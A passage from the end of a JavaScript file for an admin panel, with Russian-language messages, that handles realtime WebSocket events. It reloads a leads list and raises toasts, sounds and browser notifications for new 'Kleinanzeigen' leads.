          playBrandedLogSound(logBrand);
        }
      },
      onLeadsUpdate: function () {
        scheduleLeadsReloadFromWs(true);
      },
      onKleinNewLead: function (data) {
        var klId = data && data.leadId != null ? String(data.leadId) : '';
        var klMail = ((data && data.emailKl) && String(data.emailKl).trim()) || ((data && data.email) && String(data.email).trim()) || '';
        var klMsg = 'Новый лид Kleinanzeigen' + (klMail ? ': ' + klMail : '') + (klId ? ' · id ' + klId : '');
        showToast(klMsg, 'success');
        playKleinNewLeadSound();
        try {
          if (typeof Notification !== 'undefined') {
            if (Notification.permission === 'granted') {
              new Notification('Klein: новый лид', { body: klMsg, tag: 'klein-new-' + klId });
            } else if (Notification.permission === 'default' && !wsKleinNotifPermissionRequested) {
              wsKleinNotifPermissionRequested = true;
              Notification.requestPermission().then(function (perm) {
                if (perm === 'granted') {
                  new Notification('Klein: новый лид', { body: klMsg, tag: 'klein-new-' + klId });
                }
              });
            }
          }
        } catch (nErr) {}
      }
    });
    if (adminRealtimeWsController && typeof adminRealtimeWsController.connect === 'function') {
      adminRealtimeWsController.connect();
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
